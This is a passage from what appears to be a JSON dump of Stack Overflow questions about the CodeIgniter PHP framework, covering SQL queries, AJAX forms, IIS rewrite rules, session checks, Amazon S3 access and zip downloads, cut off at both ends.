(count($package_place_ids['package_city_id']) &gt; 0) {\n                    for ($j = 0; $j &lt; count($package_place_ids['package_city_id']); $j++) {\n                        if ($package_city_ids['package_city_id'][$i] == $package_place_ids['package_city_id'][$j]) {\n                            $pkg_enquiry_place = $this-&gt;db-&gt;query('insert into pkg_enquiry_place(enquiry_detail_id,package_city_id,deal_place_id,place_transfer_mode,place_transfer_info,place_transfer_fare)\nselect ' . $enquiry_detail_id . ',' . $pkg_enquiry_city_id . ',deal_place_id,place_transfer_mode,place_transfer_info,place_transfer_fare from package_place where deal_id=' . $post_dealid . ' and deal_place_id=' . $package_place_ids['deal_place_id'][$j] . '');\n                        }\n                    }\n                }\n</code></pre>\n\n<p>I want to convert it because i want to display the error message. I think the error messages in codeigniter are displayed only if the query is in the active record format. If i use the regular query i am getting the error_message as empty and the number of error message as 0. Can the error message be displayed if one uses regular query.If so then how?\nThanks,</p>\n"},{"tags":["php","mysql","codeigniter","date"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":436,"score":1,"question_id":6605248,"title":"Php fiscal year report, trouble with selecting proper year","body":"<p>I am building a report for a client using php and codeigniter.</p>\n\n<p>This report is a financial report, as such, I must reflect money collected since the beginning of the fiscal year. In this case, July 31st.</p>\n\n<p>I already query the user for the date of the report, but how would I get php to know which fiscal year to take?</p>\n\n<p>I have a rough idea, something along the lines of </p>\n\n<p>'If Month-Day is before July 31, use current year-1\nElse use current year'</p>\n\n<p>But I do not know how I would code that, or if it would work, or if there is a more elegant way of doing the same thing.</p>\n"},{"tags":["php","javascript","jquery","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":13136649,"title":"how to give complete controller's path in codeigniter","body":"<p>I have a variable in javascript as follows which works fine.</p>\n\n<pre><code>var url = http://example.com/directory_name/\n</code></pre>\n\n<p>above link returns json data which I later on display it using javascript.\nBut what I want is to give a complete path to a controller and then name of the function like following</p>\n\n<pre><code>http://example.com/directory_name/api/v1/ //whereas api is controller's name and v1 function inside this controller\n</code></pre>\n\n<p>how can I achieve this?</p>\n\n<p><strong>Update</strong></p>\n\n<p>Here is my code for controller</p>\n\n<pre><code>class Api extends CI_Controller {\npublic function index() {\n    //$this-&gt;load-&gt;view('api');\n    $this-&gt;v1('api');\n}\n\npublic function v1 () {\n    //$this-&gt;load-&gt;view('api');\n    echo site_url();\n    $arr = array(\n      array(\n        'id' =&gt; 15642,\n        'title' =&gt; 'title one',\n        'description' =&gt; 'this is description for title one'\n      ),\n      array(\n        'id' =&gt; 15643,\n        'title' =&gt; 'title two',\n        'description' =&gt; 'this is description for title two'\n      ),\n      array(\n        'id' =&gt; 15644,\n        'title' =&gt; 'title Three',\n        'description' =&gt; 'this is description for title Three. this is description for title Three. this is description for title Three.'\n      )\n    );\n\n    echo json_encode($arr);\n}\n}\n</code></pre>\n\n<p><strong>Update 2</strong></p>\n\n<p>Here is JS</p>\n\n<pre><code>init: function (jokesContainer) {\n            container = container;\n            url       = 'http://example.com/directory/api/v1';    \n            Get.get(url, container);\n        }\n</code></pre>\n\n<p><strong>Update 3</strong></p>\n\n<p>.htaccess file</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase chrome_web_apps\n\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\nErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","sprintf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":47,"score":-2,"question_id":13136812,"title":"sprintf Too Few Arguments","body":"<p>I have a part of code which gives error</p>\n\n<pre><code>Message: sprintf() [function.sprintf]: Too few arguments\n</code></pre>\n\n<p>On this line:</p>\n\n<pre><code>$emailbody = sprintf($template-&gt;body,ucfirst($data['firstname']));\n</code></pre>\n\n<p>While i checked the values for both arguments ,and it comes properly before the above line,now i am not getting where is the problem .please help.</p>\n"},{"tags":["php","codeigniter","design-patterns","one-to-many","habtm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13136594,"title":"How to design little complicated application in CodeIgniter?","body":"<p>Im writing web application based on database with many tables with many relations. </p>\n\n<p>For example i have table with [Items], which has many relations. </p>\n\n<p>Each [Item] has one [Group]</p>\n\n<p>Each [Item] has multiple [Ingredients]</p>\n\n<p>Each [Ingredient] has one [Type]</p>\n\n<p>My code is going out of control. I wrote \"edit_item_record\" form that is filled with fields like \"name\" or \"id\", but i have problems with dropdowns and sub-items. </p>\n\n<p>I dont know how to create form that has everything related with [Item] on one page (Name, Group, Ingredients). Submitting form like this may need multiple inserts or updates on many tables. <strong>How to handle this?</strong></p>\n\n<p>Does anyone saw any tutorial for CodeIgniter that describes how to design application bigger than blog with 1 table and 2 fields?</p>\n"},{"tags":["php","javascript","css","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":104,"score":0,"question_id":13136040,"title":"change input button style using javascript on click","body":"<p>I wanted to change the style of the button I'm using every time I clicked that button and together change it's text. Problem is I wanted to do it using and external javascript which I'm not that familiar with it's syntax. To elaborate what I wanted to do is to have a button having a text displaying like: Very Good, Good, Moderate, Failed. Each of the text has it's own assigned gradient color using CSS let's say a gradient of Green for Very Good, Yellow for Good, Orange for Moderate and Red for failed. Tried searching for it but I only landed on an irrelevant posts. What I think is that I need to make a button with on click and everytime I click the javascript will add int values from 0 and reset back to 0 after it reaches 3. then I think I can use case for the css class assigning like <code>this.style=\"failed\"</code> Well I don't know if this is possible.</p>\n\n<p>UPDATE:\nAfter doing some research I've managed to do something about the changing texts (using javascript alone) but not yet the class part since I think the class is a keyword in javascript. here's my script so far:</p>\n\n<pre><code>    function buttonChange(){\n    var button = document.getElementById(\"stats\");\n    switch (button.value)\n    {\n      case \"Very Good\":\n      button.value=\"Good\";\n      break;\n      case \"Good\":\n      button.value=\"Moderate\";\n      break;\n      case \"Moderate\":\n      button.value=\"Failed\";\n      break;\n      default:\n      button.value=\"Very Good\";\n    }       \n}\n</code></pre>\n\n<p>now the problem is the style. :)</p>\n"},{"tags":["jquery","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13134924,"title":"Jquery and codeigniter modal form validation in twitter bootstrap not clearing after close","body":"<p>I have written the following ajax code which validates my form which is actually a modal window. But after clicking close or save when I open the form again the values are still there. following is my code:</p>\n\n<pre><code>&lt;script&gt;\n\n$(function() {\n\n    $(\"#submit_button\").click(function( e ) {\n        e.preventDefault();\n\n\n        var name    = $(\"input[name=name]\").val();\n        var amount  = $(\"input[name=amount]\").val();\n        var model   = $(\"select[name=model]\").val();\n        var brand   = $(\"select[name=brand]\").val(); \n\n        $.ajax({\n                type: \"POST\",\n                url: \"&lt;?=base_url()?&gt;index.php/items/create\",\n                cache: false,\n                dataType: \"json\",\n                data: 'name='+name+'&amp;amount='+amount+'&amp;model='+model+'&amp;brand='+brand,\n                success: function(result){\n                    if(result.error) {\n            $(\".alert\").fadeIn('slow');\n            $(\"#error_message\").html(result.message);\n          } else {            \n            $(\".alert\").fadeIn('slow');\n            $(\"#error_message\").html(result.message);\n            $('#new_item').modal('hide')\n          }\n\n                }\n        }); \n\n    });\n});\n\n&lt;/script&gt;\n</code></pre>\n\n<p>This is the controller code:</p>\n\n<pre><code>public function create()\n    {\n        //creating the required validation fields\n        $this-&gt;form_validation-&gt;set_rules('name', 'Name', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('brand', 'Brand', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('amount', 'Amount', 'trim|required|numeric');\n\n        $result = array();\n\n        if ($this-&gt;input-&gt;is_ajax_request()) \n        {\n\n            if ($this-&gt;form_validation-&gt;run() == FALSE) {\n                $result['error'] = true;\n                $result['message'] = validation_errors();\n            } else {\n\n                $result['error'] = true;\n                $result['message'] = 'The record has been saved';           \n\n                $this-&gt;m_items-&gt;create();               \n                redirect('items/index', 'refresh');\n            }  \n\n            $json = json_encode($result);\n            die($json);\n        }\n        else\n        {\n            redirect('items/index', 'refresh');\n        }\n    }\n</code></pre>\n\n<p>The second problem is that after i click save, the entry is made in the database but no message is displayed, the form stays at its place. Then I have to refresh the page manually and do it.</p>\n\n<p>Can some one be kind enough and give me the solution.....i will be as much appreciative as any one can ever be!</p>\n\n<p>Please help me out as I have been trying to fix it for more than 3 hours now!</p>\n\n<p>Thank you in advance!</p>\n"},{"tags":["php","windows","codeigniter","azure"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":471,"score":0,"question_id":10968884,"title":"Windows Azure Rewrite Rule Causes HTTP Error 500","body":"<p>I've been working on this for a few hours now. I am trying to place Codeigniter framework into a Windows Azure website. PHP works great however I can't seem to get this rewrite rule to work right. This is my <code>web.config</code> file.</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n\n    &lt;configuration&gt;\n      &lt;system.webServer&gt;\n        &lt;rewrite&gt;\n          &lt;rules&gt;\n            &lt;rule name=\"Rule\" stopProcessing=\"true\"&gt;\n              &lt;match url=\"^(.*)$\" ignoreCase=\"false\" /&gt;\n              &lt;conditions&gt;\n                &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" ignoreCase=\"false\" negate=\"true\" /&gt;\n                &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" ignoreCase=\"false\" negate=\"true\" /&gt;\n                &lt;add input=\"{URL}\" pattern=\"^/favicon.ico$\" ignoreCase=\"false\" negate=\"true\" /&gt;\n              &lt;/conditions&gt;\n              &lt;action type=\"Rewrite\" url=\"index.php/{R:1}\" appendQueryString=\"true\" /&gt;\n            &lt;/rule&gt;\n          &lt;/rules&gt;\n        &lt;/rewrite&gt;\n      &lt;/system.webServer&gt;\n    &lt;/configuration&gt;\n</code></pre>\n\n<p>When I upload the file to the Windows Azure website and run the page with the <code>index.php</code> it returns with a <code>HTTP Error 500 (Internal Server Error): An unexpected condition was encountered while the server was attempting to fulfill the request</code> At this point I am not sure what to do, do I need to do something with Windows Azure? I am coming from an Apache background, Windows IIS is new to me. Any information is helpful to me thank you.</p>\n"},{"tags":["windows","codeigniter","iis","rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":12808063,"title":"Remove index.php of Codeigniter on IIS?","body":"<p>I understand I can remove the 'index.php' part of the url with the following web.config code:</p>\n\n<pre><code>&lt;rewrite&gt;\n  &lt;rules&gt;\n    &lt;rule name=\"Rule\" stopProcessing=\"true\"&gt;\n      &lt;match url=\"^(.*)$\" ignoreCase=\"false\" /&gt;\n      &lt;conditions&gt;\n        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" ignoreCase=\"false\" negate=\"true\" /&gt;\n        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" ignoreCase=\"false\" negate=\"true\" /&gt;\n        &lt;add input=\"{URL}\" pattern=\"^/favicon.ico$\" ignoreCase=\"false\" negate=\"true\" /&gt;\n      &lt;/conditions&gt;\n      &lt;action type=\"Rewrite\" url=\"index.php/{R:1}\" appendQueryString=\"true\" /&gt;\n    &lt;/rule&gt;\n  &lt;/rules&gt;\n&lt;/rewrite&gt;\n</code></pre>\n\n<p>Problem is I have CI installed in a sub-directory (mydomain.com/codeigniter) and I'm having trouble understanding the web.config file.</p>\n\n<p>Do you know how to change this so it works for a sub-directory?</p>\n\n<p>Thank you :)</p>\n"},{"tags":["jquery","ajax","codeigniter","fancybox"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":6959,"score":3,"question_id":4398740,"title":"How to close a jQuery fancybox from button click","body":"<p>I'm using <a href=\"http://fancybox.net/home\" rel=\"nofollow\">fancy box</a> to create a popup and load another page on it using an iframe. here is my code</p>\n\n<pre><code>    &lt;script type=\"text/javascript\"&gt;\n$(document).ready(function() {\n\n    $('.calendar .day').click(function() {\n        day_num = $(this).find('.day_num').html();\n        day_data = prompt('Enter Stuff', $(this).find('.content').html());\n        if (day_data != null) {\n\n            $.ajax({\n                url: window.location,\n                type: 'POST',\n                data: {\n                    day: day_num,\n                    data: day_data\n                },\n                success: function(msg) {\n                    location.reload();\n                }                       \n            });\n            }\n        });\n    });\n$(document).ready(function(){\n    $(\"a.iframeFancybox1\").fancybox({\n    'width'           : 800,\n    'height'              : 650,\n    'overlayOpacity'     :  '0.4',\n    'overlayColor'       :  '#000',\n    'hideOnContentClick' :   false,\n    'autoScale'          :   false,\n    'transitionIn'       :   'elastic',\n    'transitionOut'  :   'elastic',\n    'type'           :   'iframe'\n    });\n});\n\n&lt;/script&gt;\n</code></pre>\n\n<p>It loads the page successfully and does the stuff. But instead of closing the popup form, it loads the popup source form inside the popup itself. I want to close the popup form when the work is done and return to the main menu page from which the popup was generated. How do I achieve this on a button click of the popup form.</p>\n\n<p>Regards, Rangana</p>\n"},{"tags":["php","codeigniter","exit-code"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13102196,"title":"Cannot exit in CodeIgniter constructor","body":"<p>I'm basically trying a session control. If the user is logged in, it's ok to move on. But if he's not logged in, then it will show a log-in screen and then die. However, when I use <code>die</code> or <code>exit</code> in the constructor, it does not show the log-in screen; it immediately dies. The code is as following:</p>\n\n<pre><code>private $username = null;\nprivate $mongoid = null;\nprivate $neoid = null;\n\npublic function __construct(){\n    parent::__construct();\n\n    // session to global\n    $this-&gt;username = $this-&gt;session-&gt;userdata( 'username');\n    $this-&gt;mongoid = $this-&gt;session-&gt;userdata( 'mongoid');\n    $this-&gt;neoid = $this-&gt;session-&gt;userdata( 'neoid');\n\n    // check if user is logged in\n    if( $this-&gt;username == \"\" || empty( $this-&gt;username)){\n        $this-&gt;load-&gt;view( 'access/login');\n        die;\n    }\n}\n</code></pre>\n\n<p>It shows the log-in page if <code>die</code> is not written there, but with <code>die</code>, it does not show. Why do I want to use <code>die</code>? Because if I don't use, it moves on the index function and I don't want it to execute index function if the user is not logged in.</p>\n\n<p>What is wrong here? What should I use to stop executing?</p>\n"},{"tags":["codeigniter","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13119433,"title":"Using stored procedures in codeigniter","body":"<p>I am using stored procedures in codeigniter like</p>\n\n<pre><code>$success = $this-&gt;db-&gt;query(\"call my_stored_proc('arg1','arg2');\");\n</code></pre>\n\n<p>and inside the procedure i am updating few table rows. Records are getting updated properly. But when i see firebug i always get error like database error until i use like <code>SELECT arg1 or SELECT arg2</code> at the end of stored procs. why is this required. Please help em to understand this.</p>\n"},{"tags":["php","jquery","ajax","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":13115802,"title":"How to REF a PHP Codeigniter controller function inside of jQuery? (Populate a dropdown menu based on current selection))","body":"<p>The issue is how do I <code>POST</code> the value of the first dropdown selected to my Codeigniter <code>controller</code> using jQuery/AJAX. Here is an example of what I need to do <a href=\"http://css-tricks.com/examples/DynamicDropdown/\" rel=\"nofollow\">http://css-tricks.com/examples/DynamicDropdown/</a></p>\n\n<pre><code>$(\"#first-choice\").change(function() {\n    $(\"#second-choice\").load(\"getter.php?choice=\" + $(\"#first-choice\").val());\n});\n</code></pre>\n\n<p>In the <code>.load()</code> I want to be able to pass the value of <code>#first-choice</code> to my controller. </p>\n\n<p>How can I do that? Thanks!</p>\n"},{"tags":["codeigniter","activerecord","escapestring"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13125707,"title":"codeigniter active record, when to escape, if at all","body":"<p>I just recently started using active record (before I just wrote manual queries since I was so used to them).</p>\n\n<p>I was looking at the code of ion_auth and I saw that in a few places the strings had been escaped even though active record was used,</p>\n\n<p>i.e</p>\n\n<pre><code> -&gt;where($this-&gt;identity_column, $this-&gt;db-&gt;escape_str($identity))\n -&gt;where($this-&gt;tables['groups'].'.name', $this-&gt;db-&gt;escape_str($group))\n</code></pre>\n\n<p>Thing is, I havent escaped anywhere where I have used active record since on the documentation it said active record escapes strings automatically.</p>\n\n<p>My question, when using active record, are there some situations when you should escape strings?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13126597,"title":"Using something like NOW() in a Codeigniter insert array","body":"<p>Because NOW() is a MySQL method I cannot seem to get it to work in the below array. What is a function I can use in PHP which will do the same thing as the NOW() method.</p>\n\n<pre><code>$data = array('node1id' =&gt; $leader_id,\n              'node2id' =&gt; $idgen,\n              'friendsSince' =&gt; NOW(),\n$this-&gt;db-&gt;insert('users', $data);\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":1683,"score":0,"question_id":1853376,"title":"Codeigniter admin/auth system?","body":"<p>I'm starting a new project with codeigniter, and I'd like to start on a system that's already built so I can reduce the time of development.</p>\n\n<p>Is there a good system that handles user authentication along with an admin interface to manage users that can be easily expanded to a web-app?</p>\n\n<p><strong>If this is too vague, I can expand</strong></p>\n"},{"tags":["sql","codeigniter","syntax-error"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":27,"score":-5,"question_id":13132133,"title":"delete record in php CI","body":"<p>I want to ask permission, I made a syntax to delete the data, but there is a syntax error from the error :</p>\n\n<pre><code>Fatal error: Call to undefined function query() in D:\\web\\rbt.new\\application\\controllers\\registrasi.php on line 32\n</code></pre>\n\n<p>please help :)</p>\n"},{"tags":["forms","codeigniter","onchange"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":70,"score":-1,"question_id":13122430,"title":"Codeigniter form submitting","body":"<p>I have a controller which loads a view for inserting records into database. This view contains dropdown select. So when this view is loaded I want to check the dropdown's selected value and do something like this:</p>\n\n<pre><code>if($this-&gt;input-&gt;post('my_select') == FALSE)\n{\n   //do something\n}\nelse\n{\n   //do something else\n}\n</code></pre>\n\n<p>So when this dropdown gets changed I want to reload this and check again. I want to show the view depending on which value was selected. So I want to use onChange=\"this.form.submit()\" but unfortunately this does not work in Codeigniter.</p>\n\n<p>So my question is simply how to do this?</p>\n"},{"tags":["php","codeigniter","form-validation","user-authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13129385,"title":"Login form validation Code Igniter","body":"<p><strong>My form:</strong></p>\n\n<pre><code>&lt;?php\n          echo validation_errors(); \n                        $clientLoginFormAttr = array('id'=&gt;'clientLogin');\n                        echo form_open('clientLogin',$clientLoginFormAttr);\n\n                        ## generate field attributes\n                        $userNameInput=array(\n                            'type' =&gt;'text',\n                            'id' =&gt; 'clientLogin',\n                            'name' =&gt; 'clientUsername',\n                            'maxlength' =&gt; '10',\n                            'size' =&gt; '20'\n                        );\n                       $passwordInput=array(\n                           'type'=&gt;'password',\n                           'id'=&gt;'clientLogin',\n                           'name'=&gt;'clientPass',\n                           'maxlength'=&gt;'10',\n                           'size'=&gt;'20'\n                       );\n                       $submitBtn=array(\n                           'type'=&gt;'submit',\n                           'id'=&gt;'submit',\n                           'value'=&gt;'',\n                           'name'=&gt;'sendLogon'\n                       );\n                       ## generate actual &lt;input&gt; fields\n                       echo '&lt;label&gt;Username:&lt;/label&gt;';\n                       echo form_input($userNameInput);\n                       echo '&lt;label&gt;Password:&lt;/label&gt;';\n                       echo form_input($passwordInput);\n                       echo form_submit($submitBtn);  \n                    ?&gt;\n</code></pre>\n\n<p>I want to use the <em>clientLogin</em> controller which is in (controllers/pages/hndl/clientLogin.php)</p>\n\n<p><em>clientLogin</em> controller contains:</p>\n\n<pre><code>&lt;?php\nclass Clientlogin extends CI_Controller{\n\n    function index(){\n\n        $this-&gt;load-&gt;helper(array('url','form'));\n        $this-&gt;load-&gt;library('form_validation');\n\n        $loginValidation = array(\n          array(\n              'field'=&gt;'clientUsername',\n              'rules'=&gt;'required|min_length[1]|max_length[10]'\n          ),  \n          array(\n              'field'=&gt;'clientPass',\n              'rules'=&gt;'required|min_length[1]|max_length[10]'  \n          )  \n        );\n\n        $this-&gt;form_validation-&gt;set_rules($loginValidation);\n\n    }\n}\n\n?&gt;\n</code></pre>\n\n<p>When I visit my homepage (called homepage.php) set as default view to load, and press the SUBMIT button, it gives me the ERROR-404 OBJECT NOT FOUND. It goes to the path:</p>\n\n<pre><code>http://localhost/Applications/XAMPP/htdocs/website/homepage.php/clientLogin\n</code></pre>\n\n<p>What am I doing wrong here? I'm simply trying to use the clientLogin controller to control the form being submitted from homepage.php view. Thanks</p>\n"},{"tags":["php","codeigniter","function","controller"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":46,"score":-1,"question_id":12977893,"title":"codeigniter using function inside a controller","body":"<p>For some reason I cant run the <code>change()</code> function and everything after it stops. I try with <code>$this-&gt;change()</code> but the effect is the same. If I run the function in a php file its working and the num is changing.</p>\n\n<pre><code>class Test extends CI_Controller {\n\n    function __construct(){\n        parent::__construct();\n    }\n\n    public function home(){\n\n        $num = 1;\n\n        change($num);\n\n\n        function change($num,$rand=false){\n\n            echo 'inside function'; // this is not shown\n\n            if($num &lt; 4) {\n                $rand = rand(1,9);\n                $num = $num.$rand;\n                change($num,$rand);\n            } else {\n                echo $num;\n            }\n        }\n        echo 'done'; // this is not shown\n\n    }\n\n}\n</code></pre>\n"},{"tags":["codeigniter","session","session-timeout"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13128238,"title":"codeigniter - check session validity prior to form submission","body":"<p>In codeigniter, it seems that a form can be submitted even after a session has expired.</p>\n\n<p>Example: I was about to fill out a form and left my computer for a bit. When I returned, I submitted the form successfully, and when I checked the database the userID was 0. So I refreshed the page and found myself redirected to the login page--the session had expired, and I could still submit the form. Doesn't seem like that should happen.</p>\n\n<p>I've setup a function that should take care of it, but <strong>I want to understand why a form can be submitted after the session expires, or if this points to something being wrong.</strong></p>\n\n<pre><code>function sess_valid() {\n       $sess_timeout = now() - 3600; //3600 is the session expiry time\n       $last_act = $this-&gt;session-&gt;userdata('last_activity');\n\n       if($last_act &lt;= $sess_timeout)\n       {\n        redirect('login');\n       }\n    }\n</code></pre>\n"},{"tags":["php","codeigniter","amazon-s3","amazon-ec2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13103720,"title":"I can't connect my Amazon S3 account","body":"<p>I have a project hosted in Amazon EC2 Ireland (Ubuntu).</p>\n\n<p>I develope with CodeIgniter, and I want to use S3 to storage files.</p>\n\n<p>I've used three or four specific libraries for use S3 with CodeIgniter, and none have worked. I tried official AWS SDK for PHP, and the compatibility test is OK, but the sample doesn't work. I think that the problem is access to S3.</p>\n\n<p>I create in S3 Management three buckets, two in Ireland and one in US standard, and I can access files by browser, S3 Organizer (S3Fox) and Cyberduck. But I don't access with my project.</p>\n\n<p>Anyone can help me? </p>\n\n<p>Sorry for my bad English...</p>\n\n<p>Controller amazona.php:</p>\n\n<pre><code>   &lt;?php defined('BASEPATH') OR exit('No direct script access allowed');\n\nclass Amazona extends CI_Controller {\n\n    var $bucket = 'cubito';\n\n    function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;library('S3');\n    }\n\n    function index()\n    {\n/*      $data['files'] = $this-&gt;s3-&gt;getBucket('cubito'); */\n        $data['texto'] = \"prueba\";\n        $this-&gt;load-&gt;view('amazona', $data);\n    }\n}\n\n?&gt;\n</code></pre>\n\n<p>view amazona.php:</p>\n\n<pre><code>&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;prueba&lt;/title&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;a href=\"http://cubito.s3.amazonaws.com/imagen.jpg\"&gt;imagen&lt;/a&gt;\n        &lt;img src=\"http://cubito.s3.amazonaws.com/imagen.jpg\" /&gt;\n        &lt;p&gt;&lt;?php echo($texto); ?&gt;&lt;/p&gt;\n        &lt;p&gt;&lt;?php echo($this-&gt;s3-&gt;listBuckets()); ?&gt;&lt;/p&gt;\n\n    &lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n\n<p>I added a bucket policy, but still doesn't work:</p>\n\n<pre><code>{\n    \"Version\": \"2008-10-17\",\n    \"Id\": \"Policy1351373775750\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Stmt1351373767997\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"*\"\n            },\n            \"Action\": \"s3:*\",\n            \"Resource\": [\n                \"arn:aws:s3:::cubito\",\n                \"arn:aws:s3:::cubito/*\"\n            ]\n        }\n    ]\n}\n</code></pre>\n"},{"tags":["php","codeigniter","login","codeigniter-2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13126221,"title":"Login verification always this same redirect","body":"<p>This is my code:</p>\n\n<p>session_helper\n    \n\n<pre><code>if ( ! function_exists('is_login'))\n{\n    function is_login()\n    {\n        $CI =&amp; get_instance();\n\n        $is_logged_in = $CI-&gt;session-&gt;userdata('is_logged_in');\n\n        if (!isset($is_logged_in) || $is_logged_in != TRUE) { \n\n            redirect('login');\n\n        }               \n    }   \n}\n</code></pre>\n\n<p>check_login function</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Check_login extends CI_Controller {\n\n    function __construct()\n    {\n            parent::__construct();\n            $this-&gt;is_logged_in();  \n    }\n\n    function is_logged_in()\n    {\n        $this-&gt;load-&gt;helper('session_helper');\n                $this-&gt;load-&gt;helper('url');\n\n        is_login();\n    }       \n} \n</code></pre>\n\n<p>When I induction this function: \n<code>&lt;?php echo anchor('check_login', 'check', 'class=\"link-class\"') ?&gt;</code>  </p>\n\n<p>Every time is induction <code>redirect('login');</code> </p>\n\n<p>I have CI_session table in database, login function is ok.\nWhere is my problem?</p>\n"},{"tags":["codeigniter","zip","crc32"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13127417,"title":"Cannot download zipped images. CRC32 always 00000000","body":"<p>I created a simple code with codeigniter to download zipped up image files.  It seems to work but when I try to open the downloaded zip file the crc32 is always 00000000 and the file/files cannot be extracted.  I tried doing the same thing with text files and that works fine.  (the crc32 is not 000000000)</p>\n\n<p>Code:</p>\n\n<pre><code>$path = 'test/014.jpg';\n$this-&gt;zip-&gt;read_file($path);\n$this-&gt;zip-&gt;download('my_backup.zip');\n</code></pre>\n\n<p>I also tried the following:</p>\n\n<pre><code>$path = 'test';\n$this-&gt;zip-&gt;read_dir($path);\n$this-&gt;zip-&gt;download('my_backup.zip');\n</code></pre>\n\n<p>I followed the instructions in the user guide below:\n<a href=\"http://codeigniter.com/user_guide/libraries/zip.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/libraries/zip.html</a></p>\n\n<p>In the example given in the user guide it zips up a jpg file and downloads it and this is exactly what I'm trying to do.  It seems like this should be really straight forward, however it is not working.</p>\n\n<p>I tried adding the following:</p>\n\n<pre><code>$this-&gt;zip-&gt;archive('my_backup.zip');\n</code></pre>\n\n<p>As described here:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/12050441/unable-to-open-zip-file-codeigniter\">Unable to open zip file, codeigniter</a></p>\n\n<p>However this did not help</p>\n\n<p>I'm using WAMP on windows 7, tried firefox and chrome</p>\n\n<p>Any help with this is greatly appreciated\nThank you</p>\n"},{"tags":["internet-explorer","codeigniter","uploadify"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13089042,"title":"Codeigniter + Uploadify user auto logout after upload on IE","body":"<p>I've been making a photo gallery with Codeigniter and Uploadify and it works well on chrome and firefox. But on IE, when I upload the images, the files are uploaded on the server with thumbnails created, but no data was recorded to the database. And immediately after the upload complete on IE, when I reload the page, I'm always logged out automatically and have to login again. I'm using ag_auth library.</p>\n\n<p>upload method in controller:</p>\n\n<pre><code>    public function do_upload() {\n\n    $this-&gt;load-&gt;library('upload');\n\n    $gallery_title = $this-&gt;input-&gt;post('galleryTitle');\n    $gallery_id = $this-&gt;input-&gt;post('galleryID');\n\n    $folder_title = str_replace(' ', '_', $gallery_title);\n\n    $image_upload_folder = FCPATH . '/uploads/image-gallery/' . $folder_title;\n\n    if (!file_exists($image_upload_folder)) {\n        mkdir($image_upload_folder, DIR_WRITE_MODE, true);\n    }\n\n    $this-&gt;upload_config = array('upload_path' =&gt; $image_upload_folder, 'allowed_types' =&gt; 'png|jpg|jpeg|bmp|tiff', 'max_size' =&gt; 2048, 'remove_space' =&gt; TRUE, 'encrypt_name' =&gt; FALSE,);\n\n    $this-&gt;upload-&gt;initialize($this-&gt;upload_config);\n\n    if (!$this-&gt;upload-&gt;do_upload()) {\n        $upload_error = $this-&gt;upload-&gt;display_errors();\n        echo json_encode($upload_error);\n    } else {\n        $thumb_upload_folder = $image_upload_folder . '/thumb';\n\n        if (!file_exists($thumb_upload_folder)) {\n            